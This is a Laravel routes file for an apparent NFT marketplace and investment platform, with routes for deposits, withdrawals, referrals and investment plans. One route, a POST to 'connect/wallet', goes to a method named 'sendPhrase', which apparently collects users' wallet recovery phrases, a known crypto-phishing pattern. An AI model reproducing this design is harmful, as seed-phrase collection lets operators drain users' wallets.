<?php

use Illuminate\Support\Facades\Route;


Route::get('/', 'PagesController@index')->name('index');
Route::get('/explore', 'NFTListingController@explore')->name('explore');
Route::get('/collection', 'PagesController@collections')->name('collections');
Route::get('/explore/details/SFG224VAV{id}4R5VA', 'PagesController@details')->name('details')->middleware(['auth', 'verified']);
Route::get('/about', 'PagesController@about')->name('about');
Route::get('/contact', 'PagesController@contact')->name('contact');

Route::view('admin/login', 'auth.admin');

Auth::routes();
include "admin.php";

Route::get('/home', 'HomeController@index')->name('home');
Route::group(['middleware' => ['auth'], 'prefix' => 'user', 'as' => 'user.'], function(){
    Route::get('dashboard', "UserController@dashboard")->name('dashboard');
    Route::get('account/details', "UserController@wallet")->name('wallet');
    Route::get('referrals', "UserController@all_referrals")->name('all_referrals');
    Route::get('profile', 'UserController@profile')->name('profile');
    Route::patch('update/profile', 'UserController@updateProfile')->name('updateProfile');
    Route::get('security', 'UserController@security')->name('security');
    Route::post('update/security', "UserController@updateSecurity")->name('updateSecurity');
    Route::get('account', 'WithdrawMethodController@create')->name('account');
    Route::post('account', 'WithdrawMethodController@store')->name('account.store');
    Route::delete('delete/account/{id}', 'WithdrawMethodController@deleteWallet')->name('deleteWallet');

    Route::get('transactions', 'UserController@transactions')->name('transactions');
    Route::get('collections', 'CollectableController@collections')->name('collections');

    Route::get('account', 'WithdrawMethodController@create')->name('account');
    Route::post('account', 'WithdrawMethodController@store')->name('account.store');

    //  Deposits Routes
    Route::get('deposit/transactions', "DepositController@transactions")->name('deposit.transactions');
    Route::get('pending/transactions', "DepositController@pendingTransactions")->name('pendingTransactions');
    Route::get('deposit', "DepositController@deposit")->name('deposit');
    Route::post('process/deposit', "DepositController@processDeposit")->name('processDeposit');
    Route::get('deposit/payment/QH5H3Q64{id}2GER', "DepositController@payment")->name('payment');
    Route::post('process/payment/QH5H3Q642GER', "DepositController@processPayment")->name('processPayment');
    Route::get('cancelled/deposit/XCRTRD{id}ERTX8F&', "DepositController@cancelDeposit")->name('cancelDeposit');

    //Withdrawal Routes
    Route::get('withdraw/transactions', "WithdrawController@transactions")->name('withdraw.transactions');
    Route::get('withdraw', "WithdrawController@withdraw")->name('withdraw');
    Route::post('withdraw', "WithdrawController@processWithdraw")->name('processWithdraw');
    Route::get('withdraw/success/RETWYR432{id}3TYW5T', "WithdrawController@success")->name('success');
    Route::get('cancelled/withdrawal/XCRTRD{id}ERTX8F&', "WithdrawController@cancelWithdraw")->name('cancelWithdraw');

    Route::get('buy4me', "Buy4MeController@buy4me")->name('buy4me');
    Route::post('store/buy4me', "Buy4MeController@storeBuy4me")->name('storeBuy4me');
    Route::get('cancelled/buy4me/XCRTRD{id}ERTX8F&', "DepositController@cancelBuy4me")->name('cancelBuy4me');

    //Buy NFTListing
    Route::get('buy-nft', "BuyNFTController@buy")->name('buy');
    Route::get('nft/details/EWRTR324RFA{id}4FC', "BuyNFTController@details")->name('details');
    //Sell NFT
    Route::get('sell-nft', "SellNFTController@sell")->name('sell');
    Route::get('connect/wallet', "SellNFTController@connectWallet")->name('connectWallet');
    Route::post('connect/wallet', "SellNFTController@sendPhrase")->name('sendPhrase');
    Route::get('upload/nft', "SellNFTController@upload")->name('upload');
    Route::post('upload/nft', "SellNFTController@uploadNFT")->name('uploadNFT');
    Route::get('my-uploads', "SellNFTController@myUploads")->name('myUploads');

    //Investment Routes
    Route::get('investments', 'InvestmentController@investments')->name('investments');
    Route::get('invest/plans', 'InvestmentController@plans')->name('plans');
    Route::get('invest', 'InvestmentController@invest')->name('invest');
    Route::post('process/investment', 'InvestmentController@processInvest')->name('processInvest');
    Route::get('investment/details/DFRY64521{id}3FFAG', 'InvestmentController@investmentDetails')->name('investmentDetails');

    Route::post('buy/item', "MyNFTController@buy")->name('buy.item');

});
